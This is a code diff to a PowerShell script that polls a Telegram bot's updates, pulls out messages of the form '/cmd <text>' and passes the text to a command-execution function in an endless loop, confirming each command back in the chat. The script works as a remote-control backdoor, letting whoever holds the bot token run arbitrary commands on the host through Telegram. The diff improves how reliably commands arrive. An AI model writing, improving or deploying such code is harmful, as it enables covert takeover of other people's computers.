@@ -4,6 +4,7 @@ $aliveInterval = 2
 $runningProcess = $null
 $command = ""
 $debugLogs = @()
+$lastUpdateId = 0  # To keep track of the last processed update ID
 
 function Send-TelegramMessage {
     param([string]$message)
@@ -21,7 +22,6 @@ function Log-DebugMessage {
     param([string]$message)
     Write-Host "[$(Get-Date -Format "yyyy-MM-dd HH:mm:ss")] $message"
     $debugLogs += "[$(Get-Date -Format "yyyy-MM-dd HH:mm:ss")] $message"
-    Send-TelegramMessage $message  # Sending every debug message to Telegram directly
 }
 
 function Send-DebugLogs {
@@ -33,18 +33,22 @@ function Send-DebugLogs {
 }
 
 function Get-TelegramUpdates {
-    $url = "https://api.telegram.org/bot$token/getUpdates"
+    $url = "https://api.telegram.org/bot$token/getUpdates?offset=$($lastUpdateId + 1)"  # Using offset to process only new updates
     try {
         Log-DebugMessage "Fetching Telegram updates..."
         $response = Invoke-RestMethod -Uri $url -Method Get
         Log-DebugMessage "Received response: $($response | ConvertTo-Json)"
+        
         if ($response.result.Count -gt 0) {
-            $command = $response.result[-1].message.text
-            if ($command -notmatch "^/") {
-                return
+            foreach ($update in $response.result) {
+                $lastUpdateId = $update.update_id  # Update the last processed update ID
+                $command = $update.message.text
+                if ($command -match "^/cmd (.+)$") {
+                    Log-DebugMessage "Received command: $command"
+                    Send-TelegramMessage "Command received: $command"
+                    return $matches[1]  # Return the command to execute
+                }
             }
-            Log-DebugMessage "Received command: $command"
-            Send-TelegramMessage "Command received: $command"
         }
     }
     catch {
@@ -90,14 +94,12 @@ function Execute-Command {
 # Main loop to handle updates
 while ($true) {
     Log-DebugMessage "Checking for Telegram updates..."
-    Get-TelegramUpdates
+    $command = Get-TelegramUpdates
 
-    if ($command -match "^/cmd (.+)$") {
-        $commandToExecute = $matches[1]
-        Execute-Command $commandToExecute
-    }
-    else {
-        Send-TelegramMessage "Unknown command."
+    if ($command) {
+        Execute-Command $command
+    } else {
+        Log-DebugMessage "No new command received or invalid command."
     }
 
     Start-Sleep -Milliseconds 500
